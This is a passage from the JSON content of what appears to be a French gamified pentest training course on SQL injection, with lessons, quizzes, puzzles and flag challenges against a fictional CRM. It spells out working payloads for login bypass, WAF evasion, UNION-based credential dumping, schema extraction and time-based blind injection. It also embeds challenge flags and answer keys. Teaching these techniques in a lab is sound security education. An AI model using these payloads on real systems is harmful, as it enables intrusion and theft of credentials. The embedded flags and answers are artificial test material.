            "text": "-- Requête finale interprétée par la base de données :"
          },
          {
            "num": 2,
            "text": "SELECT * FROM users WHERE user = '' OR 1=1 --' AND pass = '...';",
            "isCritical": true,
            "note": "' OR 1=1 rend la condition toujours vraie, et -- neutralise la vérification du mot de passe"
          },
          {
            "num": 3,
            "text": "-- La base connecte l'attaquant sur le premier compte (généralement admin)"
          }
        ],
        "prompt": "Clique sur la requête qui contient l'injection booléenne ' OR 1=1 -- :"
      },
      "tokenPuzzle": {
        "instruction": "Reconstitue dans l'ordre le payload de bypass d'authentification universel :",
        "tokens": [
          "'",
          "OR",
          "1=1",
          "--"
        ],
        "correctOrder": [
          "'",
          "OR",
          "1=1",
          "--"
        ]
      },
      "quickQuiz": {
        "prompt": "Quel est le rôle exact des deux tirets '--' à la fin du payload d'injection SQL sous SQLite / MySQL ?",
        "options": [
          {
            "text": "Décrémenter la valeur de la variable de session.",
            "isCorrect": false,
            "debrief": "Faux. En SQL, la décrémentation n'utilise pas la syntaxe -- de cette façon."
          },
          {
            "text": "Indiquer le début d'un commentaire SQL, forçant le moteur à ignorer la fin de la requête originale.",
            "isCorrect": true,
            "debrief": "Exact ! Tout ce qui suit les deux tirets (dont le mot de passe prévu) est ignoré par l'analyseur."
          },
          {
            "text": "Créer un tunnel VPN chiffré vers l'attaquant.",
            "isCorrect": false,
            "debrief": "Faux. Le SQL n'ouvre pas de tunnels VPN."
          },
          {
            "text": "Redémarrer le serveur de base de données en mode sans échec.",
            "isCorrect": false,
            "debrief": "Faux. -- est un simple commentaire de syntaxe."
          }
        ]
      }
    },
    "challenge": {
      "type": "crm_target",
      "instructions": "Dans le CRM Aegis, injecte la charge utile booléenne universelle ' OR 1=1 -- dans la recherche pour forcer la sortie de tous les enregistrements. Soumets le drapeau FLAG{...} révélé dans le mémo confidentiel !",
      "flag": "FLAG{SQLI_UNION_EXTRACTED_CRM_DATA}"
    }
  },
  {
    "id": "m3-mid",
    "unitId": "m3",
    "title": "ÉVALUATION MI-PARCOURS : INFILTRATION DU CRM CONFIDENTIEL",
    "icon": "🛡️",
    "isCheckpoint": true,
    "xp": 75,
    "lessonSlides": [
      {
        "title": "PENTEST BDD : Dossier Stratégique Classifié ShadowVault",
        "bullets": [
          "Le conseil d'administration d'Aegis Defense utilise ce CRM pour stocker les contrats confidentiels les plus sensibles.",
          "Un client VIP classifié 'ShadowVault' a été enregistré dans la base de données. Il est invisible lors d'une recherche classique.",
          "Cette épreuve récapitule : requêtes relationnelles, opérateurs logiques WHERE, bris de guillemets et neutralisation des filtres SQL."
        ]
      },
      {
        "title": "Mission d'Infiltration (Sans Guidage)",
        "bullets": [
          "1. Ouvre l'interface de recherche du CRM d'entreprise ci-dessous.",
          "2. Analyse la logique SQL sous-jacente et exploite la vulnérabilité sans aucune aide assistée.",
          "3. Force le moteur de base de données à déverser tous les comptes confidentiels et soumets le FLAG du dossier VIP !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 500 130\" class=\"w-full h-full\">\n          <rect width=\"500\" height=\"130\" rx=\"12\" fill=\"#0f172a\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <circle cx=\"65\" cy=\"65\" r=\"32\" fill=\"#f59e0b\" fill-opacity=\"0.15\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"65\" y=\"74\" fill=\"#f59e0b\" font-size=\"28\" text-anchor=\"middle\">🛡️</text>\n          <text x=\"120\" y=\"45\" fill=\"#f8fafc\" font-size=\"14\" font-family=\"monospace\" font-weight=\"bold\">CHECKPOINT INFILTRATION BDD CRM</text>\n          <text x=\"120\" y=\"70\" fill=\"#94a3b8\" font-size=\"11\" font-family=\"monospace\">Cible : Base SQLite / crm_customers [VIP Vault]</text>\n          <rect x=\"120\" y=\"85\" width=\"350\" height=\"26\" rx=\"6\" fill=\"#1e293b\" stroke=\"#334155\"/>\n          <text x=\"130\" y=\"102\" fill=\"#f59e0b\" font-size=\"11\" font-family=\"monospace\">Objectif : Extraire le mémo classifié du Général</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "sql",
        "lines": [
          {
            "num": 1,
            "text": "-- Injection d'évasion booléenne sur le moteur de recherche CRM :"
          },
          {
            "num": 2,
            "text": "SELECT * FROM crm_customers WHERE company LIKE '%' OR 1=1 -- %'",
            "isCritical": true,
            "note": "La condition OR 1=1 force la clause WHERE à évaluer TOUTES les lignes comme vraies"
          },
          {
            "num": 3,
            "text": "-- Sortie : Affichage de l'enregistrement VIP classifié ShadowVault"
          }
        ],
        "prompt": "Clique sur la condition logique qui force la restitution de 100% des lignes classifiées :"
      },
      "tokenPuzzle": {
        "instruction": "Reconstitue la charge d'injection pour faire tomber le filtre du CRM :",
        "tokens": [
          "'",
          "OR",
          "1=1",
          "--",
          "SELECT"
        ],
        "correctOrder": [
          "'",
          "OR",
          "1=1",
          "--"
        ]
      },
      "quickQuiz": {
        "prompt": "Dans l'expression 'OR 1=1', pourquoi la condition WHERE devient-elle inconditionnellement vraie pour chaque enregistrement ?",
        "options": [
          {
            "text": "Parce que 1=1 est une commande secrète réservée aux développeurs du moteur.",
            "isCorrect": false,
            "debrief": "Faux. C'est de l'arithmétique pure exécutée par le moteur SQL."
          },
          {
            "text": "Parce que le chiffre 1 active le compte administrateur par défaut dans SQLite.",
            "isCorrect": false,
            "debrief": "Faux. 1=1 est une simple comparaison mathématique universelle."
          },
          {
            "text": "Parce que 1=1 est une tautologie mathématique toujours vraie, et que l'opérateur OR suffit à valider toute la clause.",
            "isCorrect": true,
            "debrief": "Exactement ! En logique booléenne, (Faux OU Vrai) donne toujours Vrai."
          },
          {
            "text": "Parce que la base de données est immédiatement réinitialisée en mode usine.",
            "isCorrect": false,
            "debrief": "Faux. Aucune donnée n'est altérée par une injection en SELECT."
          }
        ]
      }
    },
    "challenge": {
      "type": "crm_target",
      "instructions": "Dans le CRM Aegis, exploite la faille d'injection SQL sans assistance pour forcer l'affichage du dossier classifié 'ShadowVault Classified (VIP)'. Soumets la valeur du FLAG VIP révélé !",
      "flag": "FLAG{SQL_MID_EVAL_CRM_UNLOCKED_8821}"
    }
  },
  {
    "id": "m3-l8",
    "unitId": "m3",
    "title": "8. Variantes de Bypass & Commentaires",
    "icon": "🔀",
    "xp": 45,
    "lessonSlides": [
      {
        "title": "Tous les Systèmes ne Sont Pas Identiques",
        "bullets": [
          "Si un pare-feu applicatif (WAF) bloque l'expression `1=1` ou si le moteur n'est pas SQLite, comment adapter son attaque ?",
          "Un pentesteur professionnel doit maîtriser les variantes syntaxiques :"
        ]
      },
      {
        "title": "Les Variantes Majeures",
        "bullets": [
          "• **Égalités alternatives** : `' OR 'a'='a` ou `' OR 2>1` (pas de chiffres `1=1` évidents).",
          "• **Commentaires MySQL** : le dièse `#` est souvent utilisé à la place de `-- `.",
          "• **Commentaires multi-lignes** : `/* commentaire */` utile pour contourner les filtres d'espaces.",
          "• **Bypass avec fermeture propre** : `' OR '1'='1` ne nécessite même aucun commentaire car il referme le guillemet final tout seul !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"165\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"107\" y=\"50\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">-- commentaire</text>\n          <text x=\"107\" y=\"70\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Standard SQL / SQLite</text>\n          <rect x=\"210\" y=\"25\" width=\"165\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"292\" y=\"50\" fill=\"#fbbf24\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\"># ou /*...*/</text>\n          <text x=\"292\" y=\"70\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">MySQL / MariaDB</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "sql",
        "lines": [
          {
            "num": 1,
            "text": "-- Contournement sans chiffre via égalité de chaînes :"
          },
          {
            "num": 2,
            "text": "SELECT * FROM users WHERE user = '' OR 'a'='a' -- ' AND pass = '...';",
            "isCritical": true,
            "note": "'a'='a' est une tautologie qui remplace parfaitement 1=1 pour tromper les filtres"
          },
          {
            "num": 3,
            "text": "-- L'authentification est validée"
          }
        ],
        "prompt": "Clique sur la requête utilisant la variante avec égalité de chaînes 'a'='a' :"
      },
      "tokenPuzzle": {
        "instruction": "Assemble le payload alternatif avec tautologie alphabétique :",
        "tokens": [
          "'",
          "OR",
          "'a'='a'",
          "--"
        ],
        "correctOrder": [
          "'",
          "OR",
          "'a'='a'",
          "--"
        ]
      },
      "quickQuiz": {
        "prompt": "Pourquoi un pentesteur utilise-t-il la variante '' OR 'a'='a' au lieu de '' OR 1=1 ?",
        "options": [
          {
            "text": "Parce que cette variante exécute la requête deux fois plus vite.",
            "isCorrect": false,
            "debrief": "Faux. La différence de vitesse d'exécution est négligeable."
          },
          {
            "text": "Parce qu'elle force le serveur à passer en mode HTTPS.",
            "isCorrect": false,
            "debrief": "Faux. Le SQL ne gère pas la couche TLS du serveur."
          },
          {
            "text": "Pour contourner des filtres de sécurité ou WAF naïfs qui recherchent spécifiquement la chaîne '1=1'.",
            "isCorrect": true,
            "debrief": "Exact ! Les WAF basés sur des signatures simples bloquent 1=1 mais laissent passer 'a'='a'."
          },
          {
            "text": "Parce que le chiffre 1 est interdit par le standard SQL moderne.",
            "isCorrect": false,
            "debrief": "Faux. 1 est un entier parfaitement valide en SQL."
          }
        ]
      }
    },
    "challenge": {
      "type": "crm_target",
      "instructions": "Dans le CRM Aegis, teste la variante ' OR 'a'='a' -- dans la recherche pour valider le bypass. Soumets le drapeau FLAG{...} qui s'affiche !",
      "flag": "FLAG{SQLI_UNION_EXTRACTED_CRM_DATA}"
    }
  },
  {
    "id": "m3-l9",
    "unitId": "m3",
    "title": "9. Compter les Colonnes avec ORDER BY",
    "icon": "🔢",
    "xp": 45,
    "lessonSlides": [
      {
        "title": "Le Prérequis de l'Attaque UNION",
        "bullets": [
          "Bypass un login est amusant, mais voler l'intégralité d'une autre table (comme les mots de passe) nécessite l'attaque suprême : **UNION SELECT**.",
          "Mais l'opérateur UNION a une règle d'airain intransigeante : **les deux requêtes doivent retourner EXACTEMENT le même nombre de colonnes** !",
          "Comment deviner combien de colonnes la requête originale du développeur extrait sans avoir accès au code source ?"
        ]
      },
      {
        "title": "La Technique ORDER BY",
        "bullets": [
          "`ORDER BY N` trie les résultats selon la colonne numéro N.",
          "Si tu testes `ORDER BY 1`, ça marche. `ORDER BY 2`, ça marche. `ORDER BY 3`, ça marche...",
          "Si tu tentes `ORDER BY 100`, la base plante en disant : *Column 100 does not exist !*.",
          "Le nombre de colonnes exact est donc le **dernier numéro qui ne déclenche aucune erreur** !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"30\" width=\"80\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"65\" y=\"55\" fill=\"#34d399\" font-size=\"10\" font-family=\"monospace\" text-anchor=\"middle\">ORDER BY 1</text>\n          <text x=\"65\" y=\"75\" fill=\"#10b981\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\">✓ OK</text>\n          <rect x=\"120\" y=\"30\" width=\"80\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"160\" y=\"55\" fill=\"#34d399\" font-size=\"10\" font-family=\"monospace\" text-anchor=\"middle\">ORDER BY 3</text>\n          <text x=\"160\" y=\"75\" fill=\"#10b981\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\">✓ OK</text>\n          <rect x=\"215\" y=\"30\" width=\"80\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"255\" y=\"55\" fill=\"#34d399\" font-size=\"10\" font-family=\"monospace\" text-anchor=\"middle\">ORDER BY 6</text>\n          <text x=\"255\" y=\"75\" fill=\"#10b981\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\">✓ OK</text>\n          <rect x=\"310\" y=\"30\" width=\"75\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <text x=\"347\" y=\"55\" fill=\"#f87171\" font-size=\"10\" font-family=\"monospace\" text-anchor=\"middle\">ORDER BY 7</text>\n          <text x=\"347\" y=\"75\" fill=\"#f43f5e\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\">💥 Erreur !</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "sql",
        "lines": [
          {
            "num": 1,
            "text": "-- Détermination du nombre de colonnes par dichotomie :"
          },
          {
            "num": 2,
            "text": "SELECT id, company, contact_name, contract_value, iban, memo FROM clients ORDER BY 6 --",
            "isCritical": true,
            "note": "ORDER BY 6 réussit, ce qui prouve que la requête initiale contient au moins 6 colonnes"
          },
          {
            "num": 3,
            "text": "-- ORDER BY 7 déclenche une erreur ➔ La requête a exactement 6 colonnes !"
          }
        ],
        "prompt": "Clique sur la requête qui utilise ORDER BY pour sonder les colonnes :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la clause ORDER BY de test pour valider 3 colonnes :",
        "tokens": [
          "'",
          "ORDER BY 3",
          "--",
          "SELECT"
        ],
        "correctOrder": [
          "'",
          "ORDER BY 3",
          "--"
        ]
      },
      "quickQuiz": {
        "prompt": "Comment la clause 'ORDER BY N --' permet-elle à un pentesteur de déduire le nombre exact de colonnes retournées par une requête ?",
        "options": [
          {
            "text": "En forçant la base à supprimer les colonnes paires.",
            "isCorrect": false,
            "debrief": "Faux. ORDER BY ne supprime rien, il trie."
          },
          {
            "text": "En incrémentant N jusqu'à ce que la base renvoie une erreur indiquant que la colonne N n'existe pas.",
            "isCorrect": true,
            "debrief": "Exact ! Si ORDER BY 6 passe et que ORDER BY 7 plante, la table a exactement 6 colonnes."
          },
          {
            "text": "En lisant le numéro de série de la carte mère du serveur.",
            "isCorrect": false,
            "debrief": "Faux. Le SQL ne donne pas d'informations sur la carte mère."
          },
          {
            "text": "En demandant directement à l'administrateur par e-mail.",
            "isCorrect": false,
            "debrief": "Faux. L'attaquant cherche à déduire la structure sans intervention humaine."
          }
        ]
      }
    },
    "challenge": {
      "type": "crm_target",
      "instructions": "Dans le CRM Aegis, teste ' ORDER BY 3 -- pour confirmer que la table contient au moins 3 colonnes sans générer d'erreur. Soumets le nom de la première société cliente affichée !",
      "flag": "CyberDefense Systems"
    }
  },
  {
    "id": "m3-l10",
    "unitId": "m3",
    "title": "10. L'Attaque UNION SELECT : Vider la Base",
    "icon": "💉",
    "xp": 50,
    "lessonSlides": [
      {
        "title": "Fusionner Deux Tables : L'Opérateur UNION",
        "bullets": [
          "L'opérateur SQL `UNION` permet de coller les résultats d'une **seconde requête arbitraire** en dessous des résultats de la première requête légitime.",
          "Si la première requête cherche des clients dans `crm_customers`, l'attaquant injecte un `UNION SELECT` pour extraire des mots de passe depuis `crm_accounts` !",
          "La page web affiche alors sur ton écran les secrets d'une table que le développeur n'avait jamais prévu de te montrer."
        ]
      },
      {
        "title": "Respecter l'Alignement des Colonnes",
        "bullets": [
          "Comme nous avons découvert que la table a 6 colonnes, notre requête injectée doit impérativement avoir 6 champs :",
          "`' UNION SELECT 1, username, password, 4, 5, secret_api_key FROM crm_accounts --`.",
          "Chaque colonne cible se glisse parfaitement dans l'affichage du CRM !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"20\" width=\"350\" height=\"35\" rx=\"6\" fill=\"#0f172a\" stroke=\"#06b6d4\"/>\n          <text x=\"35\" y=\"42\" fill=\"#38bdf8\" font-size=\"10\" font-family=\"monospace\">Req 1 : SELECT id, company, contact, ... FROM clients</text>\n          <rect x=\"25\" y=\"65\" width=\"350\" height=\"35\" rx=\"6\" fill=\"#030712\" stroke=\"#10b981\"/>\n          <text x=\"35\" y=\"87\" fill=\"#34d399\" font-size=\"10\" font-family=\"monospace\">UNION : SELECT 1, user, password, 4, 5, api_key FROM accounts</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "sql",
        "lines": [
          {
            "num": 1,
            "text": "-- Extraction des comptes administrateurs via UNION SELECT :"
          },
          {
            "num": 2,
            "text": "' UNION SELECT 1, username, password, 4, 5, secret_api_key FROM crm_accounts --",
            "isCritical": true,
            "note": "UNION SELECT aligne les 6 colonnes pour déverser la table crm_accounts"
          },
          {
            "num": 3,
            "text": "-- Affiche : secops_admin | Pass_Ultra_Complex_#2026!$ | KEY{JWT_SECRET_...}"
          }
        ],
        "prompt": "Clique sur la requête qui utilise UNION SELECT pour extraire crm_accounts :"
      },
      "tokenPuzzle": {
        "instruction": "Construis la requête UNION SELECT pour aligner les colonnes et extraire les comptes :",
        "tokens": [
          "' UNION SELECT",
          "1, username, password, 4, 5, secret_api_key",
          "FROM crm_accounts --"
        ],
        "correctOrder": [
          "' UNION SELECT",
          "1, username, password, 4, 5, secret_api_key",
          "FROM crm_accounts --"
        ]
      },
      "quickQuiz": {
        "prompt": "Quelle contrainte fondamentale doit impérativement être respectée pour qu'une injection UNION SELECT réussisse sans erreur ?",
        "options": [
          {
            "text": "L'attaquant doit obligatoirement être connecté en administrateur root.",
            "isCorrect": false,
            "debrief": "Faux. L'injection s'exécute avec les privilèges de l'application web."
          },
          {
            "text": "Les deux tables doivent avoir été créées le même jour.",
            "isCorrect": false,
            "debrief": "Faux. La date de création des tables n'a aucune importance."
          },
          {
            "text": "La requête injectée doit retourner exactement le même nombre de colonnes que la requête d'origine.",
            "isCorrect": true,
            "debrief": "Exact ! Le moteur SQL exige une correspondance stricte du nombre de colonnes entre les deux requêtes de l'UNION."
          },
          {
            "text": "L'ordinateur doit posséder au moins 64 Go de mémoire RAM.",
            "isCorrect": false,
            "debrief": "Faux. L'UNION fonctionne même avec très peu de mémoire."
          }
        ]
      }
    },
    "challenge": {
      "type": "crm_target",
      "instructions": "Dans le CRM Aegis, injecte la requête UNION complète : ' UNION SELECT 1, username, password, 4, 5, secret_api_key FROM crm_accounts -- dans la recherche. Récupère la clé secrète JWT révélée et soumets la valeur KEY{...} !",
      "flag": "KEY{JWT_SECRET_SIGN_KEY_AEGIS_99}"
    }
  },
  {
    "id": "m3-l11",
    "unitId": "m3",
    "title": "11. Cartographier la Base : sqlite_master",
    "icon": "🗺️",
    "xp": 45,
    "lessonSlides": [
      {
        "title": "Comment Deviner le Nom des Tables ?",
        "bullets": [
          "Dans un vrai test d'intrusion, personne ne te donne le nom des tables (`crm_accounts`). Tu es dans le noir total.",
          "Heureusement pour l'attaquant, tous les moteurs de base de données possèdent un annuaire interne décrivant leur propre architecture :",
          "• Sous SQLite : la table système s'appelle `sqlite_master`.",
          "• Sous MySQL / PostgreSQL : c'est la vue `information_schema.tables`."
        ]
      },
      {
        "title": "Extraire le Schéma avec UNION",
        "bullets": [
          "La colonne `name` de `sqlite_master` contient le nom de chaque table.",
          "La colonne `sql` contient le code exact ayant servi à créer la table avec toutes ses colonnes !",
          "En injectant : `' UNION SELECT 1, name, sql, 4, 5, 6 FROM sqlite_master WHERE type='table' --`, l'application déverse tout son plan d'architecture sous tes yeux."
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"350\" height=\"70\" rx=\"8\" fill=\"#030712\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"40\" y=\"50\" fill=\"#fbbf24\" font-size=\"11\" font-family=\"monospace\" font-weight=\"bold\">DICTIONNAIRE DU SYSTÈME :</text>\n          <text x=\"40\" y=\"70\" fill=\"#94a3b8\" font-size=\"10\" font-family=\"monospace\">sqlite_master ➔ Contient le nom de TOUTES les tables créées</text>\n          <text x=\"40\" y=\"85\" fill=\"#38bdf8\" font-size=\"9\" font-family=\"monospace\">Extraction des tables : crm_accounts, crm_customers...</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "sql",
        "lines": [
          {
            "num": 1,
            "text": "-- Découverte des tables existantes dans la base SQLite :"
          },
          {
            "num": 2,
            "text": "' UNION SELECT 1, name, sql, 4, 5, 6 FROM sqlite_master WHERE type='table' --",
            "isCritical": true,
            "note": "sqlite_master est le catalogue interne stockant le schéma de la base"
          },
          {
            "num": 3,
            "text": "-- Révèle : crm_accounts | CREATE TABLE crm_accounts (id, username, password...)"
          }
        ],
        "prompt": "Clique sur la requête qui extrait le schéma depuis sqlite_master :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la requête pour extraire les noms de tables de sqlite_master :",
        "tokens": [
          "' UNION SELECT 1, name,",
          "sql, 4, 5, 6",
          "FROM sqlite_master WHERE type='table' --"
        ],
        "correctOrder": [
          "' UNION SELECT 1, name,",
          "sql, 4, 5, 6",
          "FROM sqlite_master WHERE type='table' --"
        ]
      },
      "quickQuiz": {
        "prompt": "Sous SQLite, quelle table système contient la liste de toutes les tables et leur structure SQL de création ?",
        "options": [
          {
            "text": "/etc/passwd",
            "isCorrect": false,
            "debrief": "Faux. /etc/passwd est un fichier Linux, pas une table SQL."
          },
          {
            "text": "sqlite_master (le dictionnaire de métadonnées du schéma SQLite).",
            "isCorrect": true,
            "debrief": "Exact ! sqlite_master contient le schéma complet de toutes les tables du fichier."
          },
          {
            "text": "sys.passwords",
            "isCorrect": false,
            "debrief": "Faux. Cette table n'existe pas sous SQLite."
          },
          {
            "text": "root_table_registry",
            "isCorrect": false,
            "debrief": "Faux. Ce nom est inventé."
          }
        ]
      }
    },
    "challenge": {
      "type": "crm_target",
      "instructions": "Dans le CRM Aegis, injecte ' UNION SELECT 1, name, sql, 4, 5, 6 FROM sqlite_master WHERE type='table' -- pour découvrir les tables cachées. Soumets le nom de la table contenant les comptes administratifs !",
      "flag": "crm_accounts"
    }
  },
  {
    "id": "m3-l12",
    "unitId": "m3",
    "title": "12. Injections SQL Aveugles (Blind SQLi)",
    "icon": "🕶️",
    "xp": 50,
    "lessonSlides": [
      {
        "title": "Quand l'Application ne Répond Rien",
        "bullets": [
          "Que faire si l'application est vulnérable à l'injection SQL mais n'affiche JAMAIS le résultat des requêtes à l'écran (ex: une page qui renvoie simplement 'Recherche terminée') ?",
          "C'est ce qu'on appelle une **Blind SQLi** (Injection SQL Aveugle).",
          "On ne peut pas lire directement les données, mais on peut poser des **questions fermées par Oui ou par Non** à la base !"
        ]
      },
      {
        "title": "Injections Booléennes et Temporelles",
        "bullets": [
          "• **Blind Booléenne** : on injecte `' AND (SELECT 1)=1 --`. Si le site affiche le résultat normal, la condition était VRAIE. Si la page est vide, la condition était FAUSSE.",
          "• **Blind Temporelle** : on demande à la base de faire une sieste : `' AND (SELECT 1 FROM (SELECT(SLEEP(5)))) --`. Si le serveur met 5 secondes à répondre, notre condition est validée !",
          "Caractère par caractère, un script peut ainsi aspirer un mot de passe complet en testant son code binaire."
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"165\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"107\" y=\"50\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">Blind Booléenne</text>\n          <text x=\"107\" y=\"70\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Page normale (VRAI)</text>\n          <text x=\"107\" y=\"85\" fill=\"#f87171\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Page vide (FAUX)</text>\n          <rect x=\"210\" y=\"25\" width=\"165\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"292\" y=\"50\" fill=\"#fbbf24\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">Blind Temporelle</text>\n          <text x=\"292\" y=\"70\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">SLEEP(5)</text>\n          <text x=\"292\" y=\"85\" fill=\"#34d399\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Délai de réponse de 5s</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "sql",
        "lines": [
          {
            "num": 1,
            "text": "-- Test d'une condition aveugle booléenne VRAIE :"
          },
          {
            "num": 2,
            "text": "SELECT * FROM clients WHERE company LIKE '%Defense%' AND (SELECT 1)=1 --",
            "isCritical": true,
            "note": "Si la condition est vraie, le serveur renvoie le résultat normal"
          },
          {
            "num": 3,
            "text": "-- Test d'une condition aveugle FAUSSE : AND 1=2 ➔ Aucun résultat !"
          }
        ],
        "prompt": "Clique sur la requête qui intègre une condition aveugle booléenne :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la condition booléenne aveugle de test vrai (1)=1 :",
        "tokens": [
          "Defense%'",
          "AND (SELECT 1)=1",
          "--",
          "SLEEP(5)"
        ],
        "correctOrder": [
          "Defense%'",
          "AND (SELECT 1)=1",
          "--"
        ]
      },
      "quickQuiz": {
        "prompt": "Comment une injection SQL aveugle temporelle (Time-based Blind SQLi) permet-elle d'extraire des informations confidentielles ?",
        "options": [
          {
            "text": "En forçant la base à marquer une pause (ex: SLEEP) uniquement si une lettre du mot de passe testée est exacte, mesurant le temps de réponse.",
            "isCorrect": true,
            "debrief": "Exact ! Si la réponse met 5 secondes, l'attaquant sait que l'hypothèse testée était vraie."
          },
          {
            "text": "En envoyant un e-mail automatique contenant le mot de passe.",
            "isCorrect": false,
            "debrief": "Faux. Blind signifie qu'aucun canal direct n'est disponible."
          },
          {
            "text": "En désactivant la batterie de sauvegarde de l'infrastructure.",
            "isCorrect": false,
            "debrief": "Faux. Le SQL est une couche logique applicative."
          },
          {
            "text": "En accélérant l'horloge système du serveur pour faire planter le système.",
            "isCorrect": false,
            "debrief": "Faux. SQL ne modifie pas l'horloge physique du processeur."
          }
        ]
      }
    },
    "challenge": {
      "type": "crm_target",
      "instructions": "Dans le CRM Aegis, teste l'injection booléenne ' AND (SELECT 1)=1 -- en recherchant 'Defense'. Vérifie que la société cliente s'affiche bien et soumets son nom exact !",
      "flag": "CyberDefense Systems"
    }
  },
  {
    "id": "m3-l13",
    "unitId": "m3",
    "title": "13. ★ BOSS FIGHT SQL : EXTRACTION TOTALE ★",
    "icon": "👑",
    "xp": 100,
    "isBoss": true,
    "lessonSlides": [
      {
        "title": "L'Épreuve Finale de Maîtrise des Données",
        "bullets": [
          "Tu es désormais un praticien aguerri des bases relationnelles et de l'exploitation SQLi :",
          "• Tu connais le modèle des tables, colonnes et lignes.",
          "• Tu maîtrises `SELECT` et le filtrage `WHERE`.",
          "• Tu comprends la concaténation fautive et l'erreur du guillemet `'`.",
          "• Tu sais contourner les authentifications avec `' OR 1=1 --`.",
          "• Tu sais compter les colonnes avec `ORDER BY` et fusionner deux requêtes avec `UNION SELECT`.",
          "Ta mission : extraire la clé cryptographique secrète de l'administrateur principal de la table `crm_accounts` !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"20\" y=\"20\" width=\"360\" height=\"80\" rx=\"10\" fill=\"#030712\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"200\" y=\"55\" fill=\"#fbbf24\" font-size=\"14\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">★ ÉPREUVE D'HOMOLOGATION SQLI PRO ★</text>\n          <text x=\"200\" y=\"75\" fill=\"#94a3b8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">UNION SELECT ➔ Dump crm_accounts ➔ Extraction KEY</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "sql",
        "lines": [
          {
            "num": 1,
            "text": "# Charge utile offensive finale UNION SELECT :"
          },
          {
            "num": 2,
            "text": "' UNION SELECT 1, username, password, 4, 5, secret_api_key FROM crm_accounts --",
            "isCritical": true,
            "note": "Dump intégral des comptes administratifs et des clés API confidentielles"
          },
          {
            "num": 3,
            "text": "secops_admin | KEY{JWT_SECRET_SIGN_KEY_AEGIS_99}"
          }
        ],
        "prompt": "Clique sur la charge utile qui extrait les clés secrètes de crm_accounts :"
      },
      "tokenPuzzle": {
        "instruction": "Construis la charge utile finale pour extraire la clé API de crm_accounts :",
        "tokens": [
          "' UNION SELECT",
          "1, username, password, 4, 5, secret_api_key",
          "FROM crm_accounts --"
        ],
        "correctOrder": [
          "' UNION SELECT",
          "1, username, password, 4, 5, secret_api_key",
          "FROM crm_accounts --"
        ]
      },
      "quickQuiz": {
        "prompt": "Quelle est la seule et unique parade absolue définitive pour immuniser une application contre les injections SQL ?",
        "options": [
          {
            "text": "L'utilisation systématique de requêtes préparées avec paramètres liés (Prepared Statements / Parameterized Queries).",
            "isCorrect": true,
            "debrief": "Exactement ! Les requêtes préparées envoient la structure SQL et les données dans deux canaux séparés, rendant l'injection physiquement impossible."
          },
          {
            "text": "Changer le mot de passe administrateur tous les lundis.",
            "isCorrect": false,
